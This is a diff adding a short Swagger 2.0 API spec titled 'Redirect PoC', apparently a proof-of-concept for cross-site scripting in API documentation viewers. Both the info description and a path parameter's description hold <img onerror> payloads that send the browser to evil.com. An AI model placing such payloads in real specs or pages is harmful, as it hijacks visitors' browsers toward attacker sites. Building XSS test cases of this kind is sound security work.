@@ -1,0 +1,26 @@
+swagger: '2.0'
+info:
+  title: Redirect PoC
+  description: |
+    <img src=x onerror="window.location='https://evil.com'">
+  version: 1.0.0
+basePath: /
+paths:
+  /redirect:
+    get:
+      summary: Normal endpoint for testing
+      responses:
+        '200':
+          description: OK
+  /redirect/{id}:
+    delete:
+      summary: Silent redirect on delete
+      parameters:
+        - name: id
+          in: path
+          required: true
+          type: string
+          description: "<img src=x onerror='window.location=`https://evil.com`'>"
+      responses:
+        '200':
+          description: OK
